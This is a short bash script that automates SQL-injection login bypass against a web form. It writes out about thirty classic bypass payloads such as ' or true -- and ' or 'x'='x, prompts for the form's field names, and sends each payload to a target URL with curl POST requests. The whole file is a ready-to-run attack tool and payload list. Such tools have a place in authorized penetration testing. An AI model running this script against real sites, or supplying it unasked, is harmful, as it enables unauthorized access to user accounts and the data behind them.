#!/bin/bash

#. Author:  AurÃ©lien DUBUS
#. Description : Simple script to test for authentication bypass with simple sqli
#.               You must copy all values of form for post request


usage(){
    echo "Usage : ${0} -u http://target.com"
}

if [[ -z ${1} ]]; then
    usage
    exit 1
fi

file="list.txt"
string="--'"
cat >> ${file} << _EOF_
' or true --
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
_EOF_

echo "What is the login parameter ?"
read log
echo "What is the password parameter?"
read password
echo "What is the submit button ?"
read submit

while getopts "u:" opt; do
  case $opt in
    u | url) url="$OPTARG"
            #echo "${url}"
            cat ${file} | while read line
            do
                curl -d "${log}=${line}&${password}=${string}&${submit}=${submit}" "${url}"
            done
      ;;
    p)
     ;;
  esac
done

rm ${file}

exit 0
